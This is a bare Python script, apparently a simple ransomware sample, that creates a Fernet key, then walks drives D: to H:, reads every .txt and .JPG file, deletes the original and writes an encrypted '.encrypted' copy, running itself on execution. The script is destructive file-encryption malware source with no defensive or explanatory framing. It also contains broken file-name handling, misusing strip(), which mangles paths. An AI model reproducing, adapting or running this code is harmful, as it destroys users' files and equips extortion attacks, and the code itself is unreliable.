import os
from cryptography.fernet import Fernet
import time
import getpass

def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
        
    with open(r"C:\\Users\\"+getpass.getuser()+"\\Desktop\\key.key", "wb") as key_file:
        key_file.write(key)


def load_key():
    return open("key.key", "rb").read()
    
def enc():
    print("hi")
    write_key()
    key = load_key()
    f = Fernet(key)
    q = ("D:\\","E:\\","F:\\","G:\\","H:\\") 
    for z in q:
        if os.path.exists(z):
            print(z)
            for subdir, dirs, files in os.walk(z):
                for filename in files:
                    filepath = subdir + os.sep + filename
                    if filepath.endswith(".txt") or filepath.endswith(".JPG"):
                        if filepath.endswith(".JPG"):
                            os.rename(filepath,filepath.strip(".JGP")+"(JPG).txt")
                            filepath = filepath.strip(".JGP")+"(JPG).txt"
                        elif filepath.endswith(".txt"):
                            os.rename(filepath,filepath.strip(".txt")+"(txt).txt")
                            filepath = filepath.strip(".txt")+"(txt).txt"    
                        c = open(filepath,'rb')
                        z = c.read()
                        c.close()
                        print(filepath)
                        os.remove(filepath)
                        encrypted = f.encrypt(z)
                        n = open(filepath.strip('.txt')+'.encrypted', 'xb')
                        n.write(encrypted)
                        n.close()
                        print(filepath)

enc()   # calling function 
